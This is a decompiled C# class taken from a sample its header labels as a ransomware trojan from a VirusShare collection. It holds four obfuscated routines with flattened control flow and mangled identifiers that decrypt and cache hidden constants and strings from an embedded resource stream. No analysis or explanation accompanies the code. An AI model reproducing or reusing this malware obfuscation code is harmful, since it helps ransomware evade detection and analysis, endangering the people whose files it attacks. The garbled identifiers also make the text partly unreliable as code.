// Decompiled with JetBrains decompiler
// Type: �uw��J�D��*m�
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79CC5886-3FF3-4BA2-A3E6-9E50089A921D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-5a26181f2f36991d9055db38b70c0df2d166b99d1714fb7a14978e2e0420b71d.exe

using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

internal static class \uFFFD\u000C\u0008uw\uFFFD\uFFFDJ\uFFFDD\uFFFD\u0014\uFFFD\u002Am\uFFFD
{
  static object \uFFFD\uFFFD\u0001\uFFFD\uFFFDH\uFFFDwnn4\uFFFDI\u0007\uFFFD\uFFFD(uint a, uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    int num1 = 34 + (~6 - (2 + 2)) - (7 - 6) - 6;
    uint num2;
    while (true)
    {
      uint num3;
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      switch (num1)
      {
        case 1:
          if (num4 < 32U)
          {
            num1 = ~-12 - 3 - 2;
            continue;
          }
          goto label_26;
        case 2:
          num5 += num2 * num3 % 32U;
          num1 = ~-(1 - -(9 - 2));
          continue;
        case 3:
          num2 -= (uint) (~((int) num6 ^ (int) num5) + 1903110294);
          goto case 15;
        case 4:
          num2 ^= num6 % num5 | 1903110294U;
          goto case 15;
        case 5:
          num5 ^= (uint) ((int) num2 * (int) num3 + 1) % 16U;
          num2 += (uint) (((int) num6 | (int) num5) ^ 1903110294);
          goto case 15;
        case 6:
          num6 ^= (uint) (((int) num2 & 16711935) << 8 ^ ((int) ((num2 & 16776960U) >> 8) | ~(int) num2 & (int) ushort.MaxValue));
          num1 = --~-3;
          continue;
        case 7:
          num2 |= (uint) ((int) num6 + ~(int) num5 & 1903110294);
          num1 = ~(3 + 2 - (27 - 6));
          continue;
        case 8:
          num2 = (uint) (((int) num2 & 16777215) << 8) | (num2 & 4278190080U) >> 24;
          num4 = (num2 & (uint) byte.MaxValue) % 64U;
          num1 = ~-7 - -6 + 6;
          continue;
        case 9:
          num2 = 1851064626U ^ num7;
          num1 = -(-17 + (8 - 8));
          continue;
        case 10:
          if (num4 < 48U)
          {
            num6 += (uint) (((int) num2 & (int) byte.MaxValue | (int) ((num2 & 16711680U) >> 16)) + (~(int) num2 & (int) byte.MaxValue));
            num5 -= (uint) ~((int) num2 + (int) num4) % 48U;
            num1 = 2 + 9 - (14 - (8 - 4 - ~2));
            continue;
          }
          break;
        case 11:
          num5 = 235105378U;
          num1 = 3 - --3;
          continue;
        case 12:
          if (num3 <= 64U)
            goto case 8;
          else
            goto label_22;
        case 13:
          num6 |= (uint) ((int) ((num2 & 65280U) >> 8) & (int) ((num2 & 16711680U) >> 16) ^ ~(int) num2 & (int) byte.MaxValue);
          num1 = ~(--9 - (6 + 9));
          continue;
        case 14:
          num5 += (num2 ^ num3 - 1U) % num4;
          num1 = 2 - ~(10 - (4 - 3 + 9));
          continue;
        case 15:
label_7:
          ++num3;
          num1 = ----12;
          continue;
        case 16:
          num7 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
          num1 = 7 - ~(-6 + -4 - -11);
          continue;
        case 17:
          num6 = 298715468U;
          num1 = 10 - -(2 + 7) + ~5 - 2;
          continue;
        case 18:
          if (num4 < 0U || num4 >= 16U)
          {
            if (num4 >= 16U)
            {
              num1 = ~~~-2;
              continue;
            }
            goto label_26;
          }
          else
          {
            num1 = -7 - -26 - 6;
            continue;
          }
        default:
          num3 = 1U;
          num1 = 6 - ~--5;
          continue;
      }
label_9:
      if (num4 >= 48U && num4 < 64U)
      {
        num6 ^= (uint) (((int) ((num2 & 16711680U) >> 16) | ~((int) num2 & (int) byte.MaxValue)) * (~(int) num2 & 16711680));
        num1 = -(~12 + (4 - 5));
        continue;
      }
      goto label_7;
label_26:
      if (num4 >= 32U)
        num1 = ~-(2 - -9);
      else
        goto label_9;
    }
label_22:
    uint num8 = num2 ^ b;
    object obj;
    if (!\u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦.TryGetValue(num8, out obj))
    {
      byte[] bytes;
      byte num9;
      lock (\u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮)
      {
        BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮);
        int num10 = -(15 - (6 + 7 + -6)) + 8;
        while (true)
        {
          switch (num10)
          {
            case 1:
              goto label_35;
            case 2:
              num9 = binaryReader.ReadByte();
              num10 = -(--5 - 12) - 6;
              continue;
            default:
              binaryReader.BaseStream.Seek((long) num8, SeekOrigin.Begin);
              num10 = --14 - (3 + 6) - 3;
              continue;
          }
        }
label_35:
        bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
      }
      byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876221 ^ currentMethod.MetadataToken);
      int num11 = ----10;
      while (true)
      {
        uint num12;
        ushort num13;
        ushort num14;
        ushort num15;
        int index;
        ushort num16;
        switch (num11)
        {
          case 1:
            num15 = num14;
            num11 = -(-19 - (7 - 8 - (4 - 3)) - ~5);
            continue;
          case 2:
            obj = (object) BitConverter.ToInt32(bytes, 0);
            goto case 7;
          case 3:
label_45:
            bytes[index] ^= (byte) ((num12 * (uint) num13 + (uint) num15) % 256U ^ (uint) numArray[index % 8]);
            num11 = -(~-6 - 5);
            continue;
          case 4:
label_46:
            if (num9 != (byte) 11)
            {
              if (num9 == (byte) 50)
              {
                obj = (object) BitConverter.ToInt64(bytes, 0);
                num11 = ~-16 - 8;
                continue;
              }
              goto case 9;
            }
            else
            {
              num11 = -(0 + (8 - 2 - (4 + 2)) - 2);
              continue;
            }
          case 5:
            num15 = (ushort) ((num12 * (uint) num15 + (uint) num16) % 65536U);
            num11 = ~~(20 - 7);
            continue;
          case 6:
            num13 = num16;
            num11 = ----1;
            continue;
          case 7:
label_53:
            \u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦[num8] = obj;
            num11 = 4 - -~-5;
            continue;
          case 8:
            goto label_50;
          case 9:
            if (num9 == (byte) 27)
            {
              obj = (object) Encoding.UTF8.GetString(bytes);
              goto case 7;
            }
            else
              goto case 7;
          case 10:
            num12 = (uint) (((int) num8 + (int) num9) * 1494844765);
            num14 = (ushort) (num12 >> 16);
            num16 = (ushort) (num12 & (uint) ushort.MaxValue);
            num11 = --21 - (3 + 4) - 8;
            continue;
          case 11:
            index = 0;
            break;
          case 12:
            obj = (object) BitConverter.ToDouble(bytes, 0);
            goto case 7;
          case 13:
            ++index;
            break;
          default:
            num13 = (ushort) ((num12 * (uint) num13 + (uint) num14) % 65536U);
            num11 = ~(7 + -(8 - 2)) + 7;
            continue;
        }
        if (index >= bytes.Length)
        {
          if (num9 != (byte) 152)
          {
            if (num9 == (byte) 117)
            {
              obj = (object) BitConverter.ToSingle(bytes, 0);
              goto label_53;
            }
            else
              goto label_46;
          }
          else
            num11 = ~-12 - ~7 - 7;
        }
        else
          goto label_45;
      }
    }
label_50:
    return obj;
  }

  static object \uFFFDT\u0019\uFFFDmm\uFFFD\uFFFDg\u001B\u001A\uFFFDF\uFFFDY\uFFFD(uint a, uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    int num1 = ~~(-1 - ~(6 + 8));
    uint num2;
    object obj;
    Stream 밬뻫曆轠閼೮;
    while (true)
    {
      uint num3;
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      int num8;
      do
      {
        switch (num1)
        {
          case 1:
            if (num7 <= 64U)
            {
              num4 = (uint) (((int) num4 & 16777215) << 8) | (num4 & 4278190080U) >> 24;
              num1 = -(4 + 3 + (4 + 7) - 44) - 6;
              continue;
            }
            goto label_29;
          case 2:
            if (!\u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦.TryGetValue(num2, out obj))
            {
              Monitor.Enter((object) (밬뻫曆轠閼೮ = \u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮));
              goto label_34;
            }
            else
              goto label_57;
          case 3:
            if (num5 >= 0U)
            {
              num1 = ~(2 - ~3 - 9) + 3;
              continue;
            }
            goto label_24;
          case 4:
            num6 += (num4 ^ num7 - 1U) % num5;
            num1 = 3 - ~~-13;
            continue;
          case 5:
            if (num5 < 16U)
            {
              num3 |= (uint) ((int) ((num4 & 65280U) >> 8) & (int) ((num4 & 16711680U) >> 16) ^ ~(int) num4 & (int) byte.MaxValue);
              num1 = 25 - (8 - -7);
              continue;
            }
            goto label_24;
          case 6:
          case 15:
label_27:
            ++num7;
            goto case 1;
          case 7:
            int num9 = (int) num5;
            num1 = 13 - -(4 - 5);
            if ((uint) num9 < 32U)
            {
              num1 = --19 - -6 - 8;
              continue;
            }
            continue;
          case 8:
            if (num5 < 48U)
            {
              num3 += (uint) (((int) num4 & (int) byte.MaxValue | (int) ((num4 & 16711680U) >> 16)) + (~(int) num4 & (int) byte.MaxValue));
              num1 = ~(-22 - ~(4 - 8) + 6);
              continue;
            }
            break;
          case 9:
            num6 = 525117119U;
            num1 = ~-29 + ~2 - 6;
            continue;
          case 10:
            num6 ^= (uint) ((int) num4 * (int) num7 + 1) % 16U;
            num4 += (uint) (((int) num3 | (int) num6) ^ 1994968677);
            num1 = 3 - (-~7 - 13 - 7);
            continue;
          case 11:
            num4 |= (uint) ((int) num3 + ~(int) num6 & 1994968677);
            goto case 6;
          case 12:
            if (num5 >= 32U)
            {
              num1 = ~-3 - -6;
              continue;
            }
            break;
          case 13:
            num2 = num4 ^ b;
            num1 = -(3 - 5) - 0;
            continue;
          case 14:
            num4 = 1442329529U ^ (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
            num3 = 595972702U;
            num1 = -~--8;
            continue;
          case 16:
            num4 -= (uint) (~((int) num3 ^ (int) num6) + 1994968677);
            goto case 6;
          case 17:
            goto label_30;
          case 18:
            goto label_31;
          case 19:
            goto label_32;
          case 20:
            goto label_33;
          default:
            num3 ^= (uint) (((int) ((num4 & 16711680U) >> 16) | ~((int) num4 & (int) byte.MaxValue)) * (~(int) num4 & 16711680));
            num1 = -2 + (5 + 3) - 2;
            continue;
        }
        if (num5 >= 48U && num5 < 64U)
        {
          num1 = ~(~4 - (-(5 - 3) - 2));
          continue;
        }
        goto label_27;
label_24:
        num8 = (int) num5;
        num1 = ~(-4 - 9);
      }
      while ((uint) num8 < 16U);
      num1 = ~(3 - 6) + 5;
      continue;
label_29:
      num1 = ~-21 - (9 - 8) - 6;
      continue;
label_30:
      num3 ^= (uint) (((int) num4 & 16711935) << 8 ^ ((int) ((num4 & 16776960U) >> 8) | ~(int) num4 & (int) ushort.MaxValue));
      num6 += num4 * num7 % 32U;
      num1 = ~-20 - 8;
      continue;
label_31:
      num6 -= (uint) ~((int) num4 + (int) num5) % 48U;
      num4 ^= num3 % num6 | 1994968677U;
      num1 = ~-(-3 - ~(4 + 5));
      continue;
label_32:
      num7 = 1U;
      num1 = ~~7 - 6;
      continue;
label_33:
      num5 = (num4 & (uint) byte.MaxValue) % 64U;
      num1 = ~-11 - 7;
    }
label_34:
    byte num10;
    byte[] bytes;
    try
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮);
      int num11 = ----1;
      while (true)
      {
        switch (num11)
        {
          case 1:
            binaryReader.BaseStream.Seek((long) num2, SeekOrigin.Begin);
            num11 = ~-~-2;
            continue;
          default:
            goto label_36;
        }
      }
label_36:
      num10 = binaryReader.ReadByte();
      bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
    }
    finally
    {
      Monitor.Exit((object) 밬뻫曆轠閼೮);
    }
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876220 ^ currentMethod.MetadataToken);
    int num12 = ~-~-3;
    while (true)
    {
      ushort num13;
      uint num14;
      int num15;
      int length;
      do
      {
        ushort num16;
        ushort num17;
        ushort num18;
        int num19;
        do
        {
          switch (num12)
          {
            case 1:
              num14 = (uint) (((int) num2 + (int) num10) * 1494844765);
              num17 = (ushort) (num14 >> 16);
              num12 = -~14 - 3;
              continue;
            case 2:
              if (num10 == (byte) 152)
              {
                obj = (object) BitConverter.ToDouble(bytes, 0);
                num12 = ----9;
                continue;
              }
              goto case 6;
            case 3:
              obj = (object) BitConverter.ToSingle(bytes, 0);
              num12 = -~~-10;
              continue;
            case 4:
              if (num10 == (byte) 11)
              {
                obj = (object) BitConverter.ToInt32(bytes, 0);
                num12 = ~-6 + 4;
                continue;
              }
              goto case 5;
            case 5:
              if (num10 == (byte) 50)
              {
                obj = (object) BitConverter.ToInt64(bytes, 0);
                num12 = ~~16 - 7;
                continue;
              }
              goto label_59;
            case 6:
              num19 = (int) num10;
              num12 = -~~-4;
              continue;
            case 7:
              goto label_52;
            case 8:
              goto label_53;
            case 9:
              goto label_56;
            case 10:
              goto label_58;
            case 11:
              goto label_59;
            case 12:
              goto label_61;
            case 13:
              goto label_54;
            default:
              num16 = num13;
              num18 = num17;
              num12 = ~(-15 - ~6);
              continue;
          }
        }
        while (num19 != 117);
        num12 = ~-9 - 12 - -7;
        continue;
label_52:
        int index = 0;
        num12 = -(-20 - ~(8 + 3)) + 5;
        continue;
label_53:
        bytes[index] ^= (byte) ((num14 * (uint) num16 + (uint) num18) % 256U ^ (uint) numArray[index % 8]);
        num16 = (ushort) ((num14 * (uint) num16 + (uint) num17) % 65536U);
        num18 = (ushort) ((num14 * (uint) num18 + (uint) num13) % 65536U);
        ++index;
label_54:
        num15 = index;
        length = bytes.Length;
        num12 = --6 + -4 + 6;
      }
      while (num15 < length);
      num12 = ~---3;
      continue;
label_58:
      num12 = -~(13 - (-4 + (2 + 7)));
      continue;
label_59:
      if (num10 == (byte) 27)
      {
        obj = (object) Encoding.UTF8.GetString(bytes);
        num12 = 17 - -~7;
        continue;
      }
      break;
label_61:
      num13 = (ushort) (num14 & (uint) ushort.MaxValue);
      num12 = ~(9 + 6 - (21 - 5));
    }
label_56:
    \u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦[num2] = obj;
label_57:
    return obj;
  }

  static object \u001C\uFFFD8\uFFFD\uFFFDD\u0018\uFFFDcH\u0004\u001D\uFFFD\uFFFD5(uint a, uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    int num1 = ~(~17 - (8 - 4));
    uint num2;
    object obj;
    while (true)
    {
      uint num3;
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      uint num8;
      int num9;
      do
      {
        switch (num1)
        {
          case 1:
            if (num4 > 64U)
            {
              num2 = num5 ^ b;
              num1 = ~(9 + 8 - (9 + 4) - 12 + ~9);
              continue;
            }
            goto case 9;
          case 2:
            num3 += num5 * num4 % 32U;
            num5 |= (uint) ((int) num6 + ~(int) num3 & 768276444);
            num1 = 7 + ~-2;
            continue;
          case 3:
            num6 ^= (uint) (((int) ((num5 & 16711680U) >> 16) | ~((int) num5 & (int) byte.MaxValue)) * (~(int) num5 & 16711680));
            num1 = 5 - ~(18 + ~(9 - 4));
            continue;
          case 4:
            if (num7 < 32U)
            {
              num6 ^= (uint) (((int) num5 & 16711935) << 8 ^ ((int) ((num5 & 16776960U) >> 8) | ~(int) num5 & (int) ushort.MaxValue));
              num1 = ~(1 - (~6 + 5) + ~5);
              continue;
            }
            break;
          case 5:
            num6 = 2066738559U;
            num1 = 7 + 3 - ~7 - 18;
            continue;
          case 6:
            num3 ^= (uint) ((int) num5 * (int) num4 + 1) % 16U;
            num1 = ~---14;
            continue;
          case 7:
            num5 = 243739935U ^ num8;
            num1 = ~---6;
            continue;
          case 8:
          case 11:
          case 16:
            ++num4;
            num1 = ~---2;
            continue;
          case 9:
            num5 = (uint) (((int) num5 & 16777215) << 8) | (num5 & 4278190080U) >> 24;
            num7 = (num5 & (uint) byte.MaxValue) % 64U;
            if (num7 >= 0U)
            {
              num1 = 25 - 5;
              continue;
            }
            goto label_24;
          case 10:
            num5 -= (uint) (~((int) num6 ^ (int) num3) + 768276444);
            num1 = 18 - 7;
            continue;
          case 12:
            num5 ^= num6 % num3 | 768276444U;
            num1 = --28 - (5 - 5) - 9;
            continue;
          case 13:
            num5 += (uint) (((int) num6 | (int) num3) ^ 768276444);
            num1 = -(-3 - (7 + 6));
            continue;
          case 14:
            num3 -= (uint) ~((int) num5 + (int) num7) % 48U;
            num1 = 9 - ~2;
            continue;
          case 15:
label_21:
            if (num7 >= 48U)
            {
              num9 = (int) num7;
              num1 = --15 - 4;
              continue;
            }
            goto case 8;
          case 17:
            goto label_26;
          case 18:
            goto label_28;
          case 19:
            goto label_29;
          case 20:
            if (num7 >= 16U)
              goto label_24;
            else
              goto label_31;
          case 21:
            goto label_32;
          case 22:
            goto label_33;
          case 23:
            goto label_34;
          default:
            num3 = 903987814U;
            num4 = 1U;
            num1 = -(~6 - -6);
            continue;
        }
label_12:
        if (num7 >= 32U && num7 < 48U)
        {
          num6 += (uint) (((int) num5 & (int) byte.MaxValue | (int) ((num5 & 16711680U) >> 16)) + (~(int) num5 & (int) byte.MaxValue));
          num1 = --16 - (5 - 3);
          continue;
        }
        goto label_21;
label_24:
        if (num7 < 16U)
          goto label_12;
        else
          goto label_25;
      }
      while ((uint) num9 >= 64U);
      num1 = --(~~7 - 4);
      continue;
label_25:
      num1 = ~(-3 - ~~8) - 6;
      continue;
label_26:
      if (!\u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦.TryGetValue(num2, out obj))
      {
        num1 = ~-(29 - 6);
        continue;
      }
      goto label_54;
label_28:
      num3 += (num5 ^ num4 - 1U) % num7;
      num1 = --(12 - ~-3);
      continue;
label_29:
      num1 = -~2 + 8;
      continue;
label_31:
      num1 = --25 - 2;
      continue;
label_32:
      num8 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
      num1 = -(~8 - (2 - 4));
      continue;
label_34:
      num6 |= (uint) ((int) ((num5 & 65280U) >> 8) & (int) ((num5 & 16711680U) >> 16) ^ ~(int) num5 & (int) byte.MaxValue);
      num1 = ~(--7 - (9 + 5));
    }
label_33:
    byte num10;
    byte[] bytes;
    lock (\u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮)
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮);
      int num11 = -23 - (-7 - (8 + 8));
      while (true)
      {
        switch (num11)
        {
          case 1:
            goto label_38;
          default:
            binaryReader.BaseStream.Seek((long) num2, SeekOrigin.Begin);
            num11 = -(-(5 - 9) - 13 - -8);
            continue;
        }
      }
label_38:
      num10 = binaryReader.ReadByte();
      bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
    }
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876223 ^ currentMethod.MetadataToken);
    int num12 = ~-6 - 3;
    while (true)
    {
      uint num13;
      ushort num14;
      ushort num15;
      int index;
      ushort num16;
      ushort num17;
      int num18;
      do
      {
        switch (num12)
        {
          case 1:
            num14 = (ushort) (num13 & (uint) ushort.MaxValue);
            num15 = num14;
            num12 = 2 - 2 - (4 - 4) + 6;
            continue;
          case 2:
            num13 = (uint) (((int) num2 + (int) num10) * 1494844765);
            num12 = -(-12 - ~~6) - 9;
            continue;
          case 3:
            ++index;
            break;
          case 4:
            if (num10 == (byte) 27)
            {
              obj = (object) Encoding.UTF8.GetString(bytes);
              goto case 5;
            }
            else
              goto case 5;
          case 5:
          case 7:
label_53:
            \u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦[num2] = obj;
            goto label_54;
          case 6:
            num17 = num16;
            index = 0;
            break;
          case 8:
label_59:
            if (num10 != (byte) 11)
            {
              num18 = (int) num10;
              num12 = -(-7 - -3);
              continue;
            }
            goto label_60;
          case 9:
            goto label_61;
          case 10:
            goto label_62;
          default:
            obj = (object) BitConverter.ToInt64(bytes, 0);
            num12 = ~(-11 - --3 - ~5);
            continue;
        }
        if (index >= bytes.Length)
        {
          if (num10 == (byte) 152)
          {
            obj = (object) BitConverter.ToDouble(bytes, 0);
            goto label_53;
          }
          else if (num10 == (byte) 117)
          {
            obj = (object) BitConverter.ToSingle(bytes, 0);
            goto label_53;
          }
          else
            goto label_59;
        }
        else
          goto label_58;
      }
      while (num18 != 50);
      num12 = ~-~-2;
      continue;
label_58:
      bytes[index] ^= (byte) ((num13 * (uint) num15 + (uint) num17) % 256U ^ (uint) numArray[index % 8]);
      num15 = (ushort) ((num13 * (uint) num15 + (uint) num16) % 65536U);
      num12 = 16 - 6;
      continue;
label_60:
      obj = (object) BitConverter.ToInt32(bytes, 0);
      num12 = ~---6;
      continue;
label_61:
      num16 = (ushort) (num13 >> 16);
      num12 = 7 - -(~(2 - 5) - 8);
      continue;
label_62:
      num17 = (ushort) ((num13 * (uint) num17 + (uint) num14) % 65536U);
      num12 = --4 - -4 - 5;
    }
label_54:
    return obj;
  }

  static object J\uFFFD\u000FSS\uFFFD\uFFFD\uFFFD\uFFFDρ\uFFFDԌE\u0007(uint a, uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    int num1 = -(12 - (3 + 9 + 6)) - 4;
    uint num2;
    while (true)
    {
      uint num3;
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      int num8;
      do
      {
        int num9;
        do
        {
          uint num10;
          switch (num1)
          {
            case 1:
              if (num3 < 32U)
              {
                num1 = ~~--6;
                continue;
              }
              break;
            case 2:
              num4 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
              num1 = ~~~-20;
              continue;
            case 3:
            case 21:
              if (num10 > 64U)
              {
                num1 = ~(4 - ~~5 - (7 + 6));
                continue;
              }
              goto label_32;
            case 4:
              num5 ^= (uint) (((int) ((num6 & 16711680U) >> 16) | ~((int) num6 & (int) byte.MaxValue)) * (~(int) num6 & 16711680));
              num7 += (num6 ^ num10 - 1U) % num3;
              num6 -= (uint) (~((int) num5 ^ (int) num7) + 2065340699);
              num1 = ~-(19 - (6 + 7 + (3 - 7)));
              continue;
            case 5:
              num6 ^= num5 % num7 | 2065340699U;
              num1 = ~2 + ~2 + 6;
              continue;
            case 6:
              num5 ^= (uint) (((int) num6 & 16711935) << 8 ^ ((int) ((num6 & 16776960U) >> 8) | ~(int) num6 & (int) ushort.MaxValue));
              num7 += num6 * num10 % 32U;
              num1 = 2 - -(15 - (3 + 5 + -6));
              continue;
            case 7:
              num6 += (uint) (((int) num5 | (int) num7) ^ 2065340699);
              num1 = 2 - (-8 - (~-8 - 0));
              continue;
            case 8:
              num10 = 1U;
              num1 = 27 + (9 - 9 + -6);
              continue;
            case 9:
            case 12:
            case 17:
              ++num10;
              num1 = --~-4;
              continue;
            case 10:
              num3 = (num6 & (uint) byte.MaxValue) % 64U;
              if (num3 >= 0U && num3 < 16U)
              {
                num5 |= (uint) ((int) ((num6 & 65280U) >> 8) & (int) ((num6 & 16711680U) >> 16) ^ ~(int) num6 & (int) byte.MaxValue);
                num7 ^= (uint) ((int) num6 * (int) num10 + 1) % 16U;
                num1 = ~(-19 - (~3 + -5) + 2);
                continue;
              }
              if (num3 < 16U)
                break;
              goto label_26;
            case 11:
              int num11 = (int) num3;
              num1 = -~--8;
              if ((uint) num11 >= 48U)
              {
                num1 = 7 - ---9;
                continue;
              }
              continue;
            case 13:
              goto label_20;
            case 14:
              goto label_21;
            case 15:
              goto label_22;
            case 16:
              goto label_23;
            case 18:
              goto label_27;
            case 19:
              goto label_29;
            case 20:
              if (num3 >= 48U)
                goto case 11;
              else
                goto label_31;
            default:
              num1 = -(-1 - 8);
              continue;
          }
          num9 = (int) num3;
          num1 = 2 - (~12 + 4);
        }
        while ((uint) num9 < 32U);
        num1 = -~25 - 6;
        continue;
label_20:
        num2 = num6 ^ b;
        num1 = -(3 - (8 - 8) - 29) - 8;
        continue;
label_21:
        num7 = 926627368U;
        num1 = --7 + 6 - 5;
        continue;
label_22:
        num6 |= (uint) ((int) num5 + ~(int) num7 & 2065340699);
        num1 = ~~(14 - (5 - 3 + (3 - 3)));
        continue;
label_23:
        num8 = (int) num3;
        num1 = ~~~-10;
      }
      while ((uint) num8 >= 64U);
      num1 = -(8 + ~9 - 0) + 2;
      continue;
label_26:
      num1 = ~(--7 - (7 + 2));
      continue;
label_29:
      num6 = 1959081335U ^ num4;
      num5 = 2034064915U;
      num1 = -(-15 - (2 - 3));
      continue;
label_31:
      num5 += (uint) (((int) num6 & (int) byte.MaxValue | (int) ((num6 & 16711680U) >> 16)) + (~(int) num6 & (int) byte.MaxValue));
      num7 -= (uint) ~((int) num6 + (int) num3) % 48U;
      num1 = -(4 - 6 - ~-4);
      continue;
label_32:
      num6 = (uint) (((int) num6 & 16777215) << 8) | (num6 & 4278190080U) >> 24;
      num1 = ~(2 - ~8 - 20 + (3 - 5));
    }
label_27:
    object obj;
    if (!\u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦.TryGetValue(num2, out obj))
    {
      byte[] bytes;
      byte num12;
      lock (\u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮)
      {
        BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮);
        binaryReader.BaseStream.Seek((long) num2, SeekOrigin.Begin);
        int num13 = -(-6 - -4);
        while (true)
        {
          switch (num13)
          {
            case 1:
              goto label_38;
            case 2:
              num12 = binaryReader.ReadByte();
              num13 = ~~(-11 - -(8 + 3));
              continue;
            default:
              bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
              num13 = -8 - ~8;
              continue;
          }
        }
      }
label_38:
      byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876222 ^ currentMethod.MetadataToken);
      int num14 = -(~-9 - (9 + 5));
      while (true)
      {
        int num15;
        do
        {
          uint num16;
          ushort num17;
          ushort num18;
          int index;
          ushort num19;
          ushort num20;
          int num21;
          do
          {
            switch (num14)
            {
              case 1:
                num14 = -(-6 + -2);
                continue;
              case 2:
                num17 = (ushort) (num16 >> 16);
                num18 = (ushort) (num16 & (uint) ushort.MaxValue);
                num14 = -(-18 - -(3 - 4)) - 8;
                continue;
              case 3:
                bytes[index] ^= (byte) ((num16 * (uint) num19 + (uint) num20) % 256U ^ (uint) numArray[index % 8]);
                num19 = (ushort) ((num16 * (uint) num19 + (uint) num17) % 65536U);
                num20 = (ushort) ((num16 * (uint) num20 + (uint) num18) % 65536U);
                ++index;
                goto case 7;
              case 4:
                num20 = num17;
                index = 0;
                num14 = ~-23 - (3 + 3) - 9;
                continue;
              case 5:
                num14 = 4 + 7 + (4 - 6) - 8 + (5 + 2);
                continue;
              case 6:
                num16 = (uint) (((int) num2 + (int) num12) * 1494844765);
                num14 = ~-(16 + -(5 + 8));
                continue;
              case 7:
                if (index >= bytes.Length)
                {
                  if (num12 == (byte) 152)
                  {
                    obj = (object) BitConverter.ToDouble(bytes, 0);
                    num14 = ~~17 - 5;
                    continue;
                  }
                  num21 = (int) num12;
                  num14 = ~-12 - 2 + 7;
                  continue;
                }
                goto case 3;
              case 8:
              case 12:
                \u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦[num2] = obj;
                num14 = ~~~-10;
                continue;
              case 9:
                goto label_51;
              case 10:
                int num22 = (int) num12;
                num14 = ~~13 - 5;
                if (num22 == 27)
                {
                  num14 = -(-4 - (6 + (5 + 9)) - -9);
                  continue;
                }
                continue;
              case 11:
                num19 = num18;
                num14 = -~(0 + 3);
                continue;
              case 13:
                goto label_57;
              case 14:
                goto label_59;
              case 15:
                goto label_60;
              case 16:
                goto label_61;
              default:
                obj = (object) BitConverter.ToInt64(bytes, 0);
                num14 = ~-(-~8 - 0);
                continue;
            }
          }
          while (num21 != 117);
          num14 = ~~5 + 9;
          continue;
label_57:
          num15 = (int) num12;
          num14 = -(-5 - --8) - 3;
          continue;
label_61:
          if (num12 != (byte) 11)
            goto label_57;
          else
            goto label_62;
        }
        while (num15 != 50);
        num14 = ~~2 - 2;
        continue;
label_59:
        obj = (object) BitConverter.ToSingle(bytes, 0);
        num14 = -1 - (~5 - (3 - 7));
        continue;
label_60:
        obj = (object) Encoding.UTF8.GetString(bytes);
        num14 = ~---9;
        continue;
label_62:
        obj = (object) BitConverter.ToInt32(bytes, 0);
        num14 = -(-6 + (6 + 8) - 29 + (7 + 9));
      }
    }
label_51:
    return obj;
  }
}
